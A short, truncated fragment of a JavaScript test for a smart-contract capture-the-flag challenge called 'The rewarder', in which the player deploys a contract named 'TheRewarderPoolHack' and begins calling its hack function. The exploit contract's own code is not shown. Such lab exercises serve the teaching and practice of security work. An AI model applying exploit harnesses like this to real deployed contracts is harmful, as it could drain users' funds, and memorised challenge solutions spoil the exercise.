...
describe("[Challenge] The rewarder", function () {
  ...
  it("Execution", async function () {
    ...
    const TheRewarderPoolHackFactory = await ethers.getContractFactory(
      "TheRewarderPoolHack",
      player
    );
    theRewarderPoolHack = await TheRewarderPoolHackFactory.deploy();
    console.log("Deployed the hack contract at ", theRewarderPoolHack.address);

    await theRewarderPoolHack.hack(
